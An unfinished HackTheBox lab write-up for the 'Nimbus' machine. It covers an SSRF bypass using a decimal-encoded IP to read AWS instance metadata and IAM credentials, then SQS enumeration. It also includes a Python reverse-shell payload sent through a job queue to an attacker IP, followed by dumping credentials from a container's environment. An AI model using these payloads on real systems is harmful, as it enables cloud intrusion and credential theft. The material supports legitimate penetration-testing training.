# Nimbus

**Platform:** HackTheBox  
**Difficulty:** Hard  
**Status:** Incomplete — foothold obtained as `worker` in a container; host/root path still needs to be finished.

## Reconnaissance
```bash
silent-scan $TARGET
nmap -sVC -p22,80 -oN service
```

**Output**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 eb:ab:8f:be:99:02:0b:3e:c4:1c:83:b2:66:2f:17:13 (ECDSA)
|_  256 c1:69:ab:84:f3:88:8b:b3:8a:ae:e2:28:35:54:35:0b (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nimbus.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Related tool notes: [silent-scan](../../../tools/recon/silent-scan.md), [nmap](../../../tools/recon/nmap.md), [feroxbuster](../../../tools/fuzz/feroxbuster.md), [curl](../../../tools/web/curl.md).

## Web Fuzzing
```bash
feroxbuster -u http://nimbus.htb -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

**Output**
```
200      GET        9l       64w      876c http://nimbus.htb/login
200      GET       63l      366w     3453c http://nimbus.htb/jobs
200      GET        1l        1w      235c http://nimbus.htb/api/v1/health
200      GET       31l      257w     1922c http://nimbus.htb/
405      GET        5l       20w      153c http://nimbus.htb/jobs/preview
```

### The /jobs Endpoint Accepts Unauthenticated Job Submissions

### Login Page Leaks a Username
http://nimbus.htb/login
```
Engineers: the job submitter is unauthenticated during the migration window — submit jobs there directly. SSH still works for shell access; ping marcus on Slack if your key needs to be re-approved.
```

### The URL Fetch Feature Is a Candidate for SSRF
http://nimbus.htb/jobs
#### The parameter accepts bare IPs — fuzz for internal address bypass
```
Fetched: http://10.129.31.0/.yml · HTTP 301
```

### Try SSRF Bypass Payloads
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#bypass-using-an-encoded-ip-address


### This Payload Works: Decimal-Encoded Host
```bash
http://2130706433/ = http://127.0.0.1
http://2852039166/latest/meta-data/.yaml
```

### Try Query String to Bypass the Validation
```bash
curl -X POST http://nimbus.htb/jobs/preview \
  -d "url=http://2852039166/latest/meta-data/?foo=.yaml" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

**Output**
```
</style>
</head>
<body>
<h1>Preview</h1>
<div class="tag"><a href="/jobs">← submit another</a></div>
<div class="panel">
<div class="meta">Fetched: <code>http://2852039166/latest/meta-data/?foo=.yaml</code> · HTTP 200</div>
<h3>Raw response</h3><pre>ami-id
hostname
iam/
instance-id
instance-type
local-hostname
local-ipv4
placement/
security-groups
</pre>
<h3>Parsed</h3><pre>ami-id hostname iam/ instance-id instance-type local-hostname local-ipv4 placement/ security-groups</pre>
</div>
```

Full technique: [AWS metadata SSRF](../../../exploits/cloud/aws-metadata-ssrf.md).

### Now We Can Read AWS Cloud Metadata
```bash
# Explore the IAM folder
curl -X POST http://nimbus.htb/jobs/preview \
  -d "url=http://2852039166/latest/meta-data/iam/?foo=.yaml" \
  -H "Content-Type: application/x-www-form-urlencoded"
# Fetch the credential role list
curl -X POST http://nimbus.htb/jobs/preview \
  -d "url=http://2852039166/latest/meta-data/iam/security-credentials/?foo=.yaml" \
  -H "Content-Type: application/x-www-form-urlencoded"
# Read the temporary credentials
curl -X POST http://nimbus.htb/jobs/preview \
  -d "url=http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role?foo=.yaml" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

**Output**
```
{
  "Code": "Success",
  "LastUpdated": "2026-06-21T13:38:34Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "<AWS_ACCESS_KEY_ID>",
  "SecretAccessKey": "<AWS_SECRET_ACCESS_KEY>",
  "Token": "<AWS_SESSION_TOKEN>",
  "Expiration": "2026-06-21T19:38:34Z"
}
```

### Configure AWS Credentials
```bash
export AWS_ACCESS_KEY_ID="<AWS_ACCESS_KEY_ID>"
export AWS_SECRET_ACCESS_KEY="<AWS_SECRET_ACCESS_KEY>"
export AWS_SESSION_TOKEN="<AWS_SESSION_TOKEN>"
export AWS_DEFAULT_REGION="us-east-1"
```

## Synchronize Clock With NTP
```bash
sudo timedatectl set-ntp true
sudo ntpdate -u pool.ntp.org
```

Related tool note: [aws](../../../tools/cloud/aws.md).

### Interact With the AWS Endpoint
```bash
aws --endpoint-url http://aws.nimbus.htb sts get-caller-identity
aws --endpoint-url http://aws.nimbus.htb sqs list-queues
```

**Output**
```
{
    "QueueUrls": [
        "http://floci:4566/847219365028/nimbus-jobs"
    ]
}
```

### Read SQS Queue Attributes
```bash
aws --endpoint-url http://aws.nimbus.htb sqs get-queue-attributes \
    --queue-url "http://floci:4566/847219365028/nimbus-jobs" \
    --attribute-names All
```

**Output**
```
{
    "Attributes": {
        "DelaySeconds": "0",
        "MessageRetentionPeriod": "345600",
        "MaximumMessageSize": "262144",
        "VisibilityTimeout": "30",
        "QueueArn": "arn:aws:sqs:us-east-1:847219365028:nimbus-jobs",
        "CreatedTimestamp": "1782047848",
        "LastModifiedTimestamp": "1782047848",
        "ApproximateNumberOfMessages": "0",
        "ApproximateNumberOfMessagesNotVisible": "0"
    }
}
```

Full technique: [SQS job YAML RCE](../../../exploits/cloud/sqs-job-yaml-rce.md).

### Create Reverse Shell YAML and Send It to the Queue
```bash
nc -lvnp 4444
cat > rev.yaml << 'EOF'
name: test-revshell
schedule: "* * * * *"
runtime: python3.11
script: |
  import socket,subprocess,os
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(("10.10.15.26",4444))
  os.dup2(s.fileno(),0)
  os.dup2(s.fileno(),1)
  os.dup2(s.fileno(),2)
  subprocess.call(["/bin/bash","-i"])
EOF
# Send
aws --endpoint-url http://aws.nimbus.htb sqs send-message \
    --queue-url "http://floci:4566/847219365028/nimbus-jobs" \
    --message-body file://rev.yaml
```

## Privilege Escalation
```bash
# First grab the user flag
cat /home/worker/user.txt
id
hostname
```
**Output**
```
uid=1000(worker) gid=1000(worker) groups=1000(worker)
f42e760d8943
```

### Confirm Container Environment
```bash
cat /proc/1/status | grep Cap
```
**Output**
```
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000
```

### Obtain New AWS Credentials From Container Environment
```bash
env
```
**Output**
```
HOSTNAME=f42e760d8943
HOME=/home/worker
OLDPWD=/
GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
PYTHON_SHA256=272179ddd9a2e41a0fc8e42e33dfbdca0b3711aa5abf372d3f2d51543d09b625
AWS_ENDPOINT_URL=http://aws.nimbus.htb
AWS_DEFAULT_REGION=us-east-1
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
LANG=C.UTF-8
AWS_ACCESS_KEY_ID=<AWS_ACCESS_KEY_ID>
PYTHON_VERSION=3.11.15
AWS_SECRET_ACCESS_KEY=<AWS_SECRET_ACCESS_KEY>
PWD=/app
QUEUE_URL=http://aws.nimbus.htb/847219365028/nimbus-jobs
```

### Internal Network Enumeration
```bash
cat /etc/hosts
cat /etc/resolv.conf
```

**Output**
```
172.18.0.1      aws.nimbus.htb
172.18.0.1      nimbus.htb
172.18.0.3      f42e760d8943
```

### AWS Internal Enumeration
```bash
aws --endpoint-url http://172.18.0.2:4566 sts get-caller-identity
aws --endpoint-url http://172.18.0.2:4566 s3 ls
aws --endpoint-url http://172.18.0.2:4566 iam list-users
aws --endpoint-url http://172.18.0.2:4566 lambda list-functions
```

## Current Stopping Point

This writeup is not complete yet. The current chain reaches the worker container, recovers internal AWS environment credentials, and confirms access to internal LocalStack-style services. The remaining work is to turn that internal AWS access into host/root compromise and capture the root flag.

## Related Notes

- [silent-scan](../../../tools/recon/silent-scan.md)
- [nmap](../../../tools/recon/nmap.md)
- [feroxbuster](../../../tools/fuzz/feroxbuster.md)
- [curl](../../../tools/web/curl.md)
- [aws](../../../tools/cloud/aws.md)
- [AWS metadata SSRF](../../../exploits/cloud/aws-metadata-ssrf.md)
- [SQS job YAML RCE](../../../exploits/cloud/sqs-job-yaml-rce.md)
